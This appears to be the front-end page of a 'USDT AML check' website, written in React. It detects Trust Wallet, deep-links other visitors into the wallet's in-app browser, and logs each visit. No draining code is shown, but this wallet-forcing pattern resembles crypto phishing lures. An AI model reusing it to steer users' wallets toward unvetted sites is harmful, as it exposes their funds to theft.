/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";

import { AMLLoading } from "@/pagesComponents/AMLLoading/AMLLoading";
import { AMLResult } from "@/pagesComponents/AMLResaults/AMLResaults";
import { ChooseNet } from "@/pagesComponents/ChooseNet/ChooseNet";
import { Home } from "@/pagesComponents/Home/Home";
import { setCurrentStep } from "@/Redux/Slice/MainSlice";
import { RootState } from "@/Redux/store";
import { useEffect, useState } from "react";
import { useDispatch, useSelector } from "react-redux";

const DOMAIN = "https://usdtcheckaml.com";

export default function Page() {
  const [isRedirect, setIsRedirect] = useState("");

  const { currentStep } = useSelector((store: RootState) => store.main);
  const dispatch = useDispatch();

  useEffect(() => {
    if (typeof window === "undefined") return;

    const params = new URLSearchParams(window.location.search);
    const utm = params.get("utm_source");

    const injected =
      (window as any).ethereum?.isTrust === true || (window as any).trustwallet;

    const isTrust =
      injected ||
      utm === "Trust_Android_Browser" ||
      utm === "Trust_iOS_Browser";

    if (injected || isTrust) {
      setIsRedirect("no redirect");
    } else {
      setIsRedirect("redirect");
    }
  }, []);

  useEffect(() => {
    if (isRedirect == "redirect") {
      window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(DOMAIN)}`;
    }
  }, [isRedirect]);

  useEffect(() => {
    fetch("/api/log", {
      method: "POST",
    });
  }, []);

  if (!currentStep) {
    return <Home />;
  }
  return (
    <>
      {currentStep == 0 && <Home />}
      {currentStep == 1 && <ChooseNet />}
      {currentStep == 2 && <AMLLoading />}
      {currentStep == 3 && (
        <AMLResult onRepeat={() => dispatch(setCurrentStep(0))} />
      )}
    </>
  );
}
